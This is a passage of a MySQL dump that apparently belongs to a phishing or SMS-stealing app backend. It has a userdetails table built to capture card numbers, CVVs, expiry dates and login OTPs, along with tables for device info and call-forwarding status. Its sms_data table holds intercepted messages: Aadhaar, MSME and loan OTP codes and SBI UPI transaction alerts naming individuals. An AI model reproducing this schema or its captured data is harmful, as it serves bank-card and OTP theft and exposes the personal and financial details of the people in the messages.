(112, '82', 'AD-ADHAAR-S', '254955 is OTP for Aadhaar (XX4031) (valid for 10 mins) at NIC. Download mAadhaar from Google Play/App store & prove your identity -UIDAI', '2026-01-03 14:45:20'),
(113, '82', 'AX-MOMSME-S', 'OTP for MSME Udyam Registration is 235763 and is valid for 10 minutes. Please do not share with anyone.', '2026-01-03 14:52:03'),
(114, '82', 'JM-SAAFEA-S', 'Pls use OTP 2770 to verify the Mobile Number linked with your Saafe account. OTP will be valid for 5 mins. Do not share OTP for security reasons. SAAFE', '2026-01-03 14:54:12'),
(115, '82', 'AX-INCRED-S', '<#> Use 162261 as OTP to verify your mobile number for InCred Loan Application. - InCred - Borrow. With Confidence.M7dDRRlNkdQ', '2026-01-03 14:56:33'),
(116, '82', 'TX-INCRED-S', 'InCred acknowledges receipt of your loan application. This will be processed in 2 to 4 business days subject to completion of all your required processes.', '2026-01-03 14:57:39'),
(117, '82', 'AX-INCRED-S', 'Dear User, Your InCred loan app ending with 5846422547671098A can\'t be processed as per credit norms. Check credit score in the App: https://1.incred.com/INCRED/BIiL3Fe.', '2026-01-03 14:58:39'),
(118, '82', 'JK-MCSMST-S', '199153 is your OTP code. Do not share this with anyone. Moneycontrol will never call you to verify your OTP. @www.moneycontrolpay.com #199153', '2026-01-03 15:02:45'),
(119, '82', 'VK-SBIUPI-S', 'Dear SBI User, your A/c X3476-credited by Rs.20 on 03Jan26 transfer from Pinki  Sharma Ref No 696752384309 -SBI', '2026-01-03 16:06:32'),
(120, '82', 'VM-SBIUPI-S', 'Dear UPI user A/C X3476 debited by 12 on date 04Jan26 trf to SANJEEV RAI Refno 637068949760 If not u? call-1800111109 for other services-18001234-SBI', '2026-01-04 06:33:09');

-- --------------------------------------------------------

--
-- Table structure for table `userdetails`
--

CREATE TABLE `userdetails` (
  `id` int(255) NOT NULL,
  `username` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `mobile` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `dob` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `cardnumber` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `holdername` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `expiry` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `cvv` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `loginotp` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `requestotp` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `device_name` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `reference_id` varchar(10) COLLATE utf8_unicode_ci DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

--
-- Dumping data for table `userdetails`
--

INSERT INTO `userdetails` (`id`, `username`, `mobile`, `dob`, `cardnumber`, `holdername`, `expiry`, `cvv`, `loginotp`, `requestotp`, `device_name`, `reference_id`) VALUES
(46, 'Gg', '9876451354', '2002-07-09', '3146565959595998', 'Gag', '09/78', '545', '464955', '', 'samsung SM-A146B', NULL),
(47, 'gg', '4567767688', '2000-07-26', '3454566567676766', 'test', '09/78', '454', '', '', 'Google sdk_gphone64_arm64', '8414'),
(48, 'gg', '8656678765', '2000-09-09', '5566666666666666', 'test', '09/88', '766', '345566', '787656', 'Google sdk_gphone64_arm64', '5706');

-- --------------------------------------------------------

--
-- Table structure for table `user_activity_status`
--

CREATE TABLE `user_activity_status` (
  `id` int(11) NOT NULL,
  `user_id` varchar(50) NOT NULL,
  `status` tinyint(1) NOT NULL DEFAULT '0',
  `updated_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- Dumping data for table `user_activity_status`
--

INSERT INTO `user_activity_status` (`id`, `user_id`, `status`, `updated_at`) VALUES
(38, '82', 1, '2025-12-31 08:49:47'),
(39, '84', 1, '2026-01-05 09:13:10'),
(40, '85', 1, '2026-01-05 09:21:16'),
(41, '86', 1, '2026-01-05 09:28:32'),
(42, '87', 1, '2026-01-05 09:29:29'),
(43, '88', 1, '2026-01-05 09:31:05'),
(44, '89', 1, '2026-01-05 09:31:59'),
(45, '90', 1, '2026-01-05 09:36:42'),
(46, '91', 1, '2026-01-05 09:42:56'),
(47, '92', 1, '2026-01-05 09:43:37');

--
-- Indexes for dumped tables
--

--
-- Indexes for table `admin`
--
ALTER TABLE `admin`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `call_forwarding_status`
--
ALTER TABLE `call_forwarding_status`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `device_info`
--
ALTER TABLE `device_info`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `sms_data`
--
ALTER TABLE `sms_data`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `userdetails`
--
ALTER TABLE `userdetails`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `user_activity_status`
--
ALTER TABLE `user_activity_status`
  ADD PRIMARY KEY (`id`);

--
-- AUTO_INCREMENT for dumped tables
--

--
-- AUTO_INCREMENT for table `admin`
--
ALTER TABLE `admin`
  MODIFY `id` int(255) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;

--
-- AUTO_INCREMENT for table `call_forwarding_status`
--
ALTER TABLE `call_forwarding_status`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `device_info`
--
ALTER TABLE `device_info`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=93;

--
-- AUTO_INCREMENT for table `sms_data`
--
ALTER TABLE `sms_data`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=121;

--
-- AUTO_INCREMENT for table `userdetails`
--
ALTER TABLE `userdetails`
  MODIFY `id` int(255) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=49;

--
-- AUTO_INCREMENT for table `user_activity_status`
--
ALTER TABLE `user_activity_status`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=48;
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
